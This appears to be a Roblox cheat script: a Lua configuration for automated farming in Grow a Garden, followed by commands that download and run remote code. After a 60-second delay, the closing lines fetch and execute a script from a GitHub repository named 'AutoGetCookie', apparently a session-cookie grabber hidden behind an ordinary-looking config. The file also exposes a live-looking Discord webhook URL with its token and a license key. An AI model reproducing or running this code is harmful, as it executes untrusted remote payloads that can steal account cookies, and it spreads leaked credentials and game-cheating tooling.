getgenv().ConfigsKaitun = {
	["Block Pet Gift"] = true,

	Collect_Cooldown = 30, -- cooldown to collect fruit
	JustFuckingCollectAll = false, -- Collect all (fruit not wait mutation)
 
	["Low Cpu"] = true,
	["Auto Rejoin"] = true,

	["Rejoin When Update"] = true,
	["Limit Tree"] = {
		["Limit"] = 300,
		["Destroy Untill"] = 250,

		["Safe Tree"] = {
			"Moon Blossom",
		}
	},

	Seed = {
		Buy = {
			Mode = "Auto", -- Custom , Auto
			Custom = {
				"Carrot",
			}
		},
		Place = {
			Mode = "Lock", -- Select , Lock
			Select = {
				"Carrot",
			},
			Lock = {
				"Sunflower",
			}
		}
	},

	["Seed Pack"] = {
		Locked = {

		}
	},

	Events = {
		["Cook Event"] = {
			Minimum_Money = 30_000_000, -- minimum money to start play this event
		},
                ["Traveling Shop"] = {
			"Bee Egg"
		},
		Craft = {
			"Primal Egg",
			"Ancient Seed Pack",
			"Bee Egg",
			"Anti Bee Egg",
			"Lightning Rod",
		},
		Shop = {
			"Zen Egg",
                        "Zen Seed Pack",
		},
		Start_Do_Honey = 2_000_000 -- start trade fruit for honey at money
	},

	Gear = {
		Buy = { 
			"Watering Can",
			"Trading Ticket",
			"Master Sprinkler",
			"Basic Sprinkler",
			"Godly Sprinkler",
			"Advanced Sprinkler",
			"Lightning Rod",
			"Tanning Mirror",
			"Medium Treat",
			"Medium Toy",
		},
		Lock = {

		},
	},

	Eggs = {
		Place = {
                        "Gourmet Egg",
			"Zen Egg",
			"Primal Egg",
			"Dinosaur Egg",
			"Oasis Egg",
			"Anti Bee Egg",
			"Paradise Egg",
			"Night Egg",
			"Bug Egg",
			"Mythical Egg",
			"Common Summer Egg",
		},
		Buy = {
			"Anti Bee Egg",
			"Paradise Egg",
			"Bee Egg",
			"Night Egg",
			"Bug Egg",
			"Mythical Egg",
			"Common Summer Egg",
                        "Common Egg",
		}
	},

	Pets = {
		["Start Delete Pet At"] = 40,
		["Upgrade Slot"] = {
			["Pet"] = {
				["Starfish"] = { 5, 100, 1 },
                                ["Capybara"] = { 3, 100, 2 }, 
			},
			["Limit Upgrade"] = 5,
			["Equip When Done"] = {
				["Seal"] = { 8, 100 },
                                ["Blood Kiwi"] = { 8, 100 },
                                ["Ostrich"] = { 5, 60 },
			},
		},
		Locked_Pet_Age = 60, -- pet that age > 60 will lock
		Locked = {
                        "French Fry Ferret",
			"Corrupted Kitsune",
			"Raiju",
			"Koi",
                        "Kitsune",
			"Spinosaurus",
			"T-Rex",
			"Dragonfly",
			"Night Owl",
			"Queen Bee",
			"Raccoon",
			"Disco Bee",
			"Fennec Fox",
			"Disco Bee",
			"Butterfly",
			"Mimic Octopus",
			"Queen Bee",
			"Red Fox",
                        ["Ostrich"] = 8,
			["Capybara"] = 5,
			["Rooster"] = 6,
			["Blood Kiwi"] = 6,
			["Seal"] = 8,
		},
		LockPet_Weight = 6, -- if Weight >= 10 they will locked,
		Instant_Sell = {
			"Shiba Inu",
			"Dog",
                        "Seagull",
                        "Crab",
		}
	},

	Webhook = {
		UrlPet = "https://discord.com/api/webhooks/1388798866467324045/1DD7lj5tsSzO3Y4FrJFcOwdUGg6gyA0nGT6F8Kfk06pdHRJBCu9k7fyu5hIvTU5AZSap",
		UrlSeed = "Url Here",
		PcName = "NVT123",

		Noti = {
			Seeds = {
				"Sunflower",
				"Dragon Pepper",
				"Elephant Ears",
			},
			SeedPack = {
				"Idk"
			},
			Pets = {
                                "French Fry Ferret",
			        "Corrupted Kitsune",
                                "Kitsune",
                                "Spinosaurus",
			        "T-Rex",
				"Disco Bee",
				"Butterfly",
				"Mimic Octopus",
				"Queen Bee",
				"Fennec Fox",
				"Dragonfly",
				"Raccoon",
				"Red Fox",
			},
			Pet_Weight_Noti = true,
		}
	},
}
License = "qTtCbAWlIJxw3Lp2g9gMvZomk9BuHAju"
spawn(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Real-Aya/Loader/main/Init.lua'))()
end)

wait(60)
spawn(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/asd33.lua"))()
end)
